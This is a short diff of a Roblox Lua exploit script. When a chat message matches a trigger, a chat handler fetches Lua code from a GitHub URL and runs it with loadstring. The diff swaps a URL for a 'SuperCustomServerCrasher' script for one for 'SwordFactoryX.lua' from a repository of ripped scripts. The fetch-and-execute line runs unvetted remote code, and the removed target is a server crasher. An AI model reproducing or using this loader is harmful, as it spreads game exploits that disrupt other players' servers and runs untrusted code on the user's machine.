@@ -52,7 +52,7 @@ end)
 
 game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if msg == b then
-loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/SwordFactoryX.lua"))()
 end
 end)
 
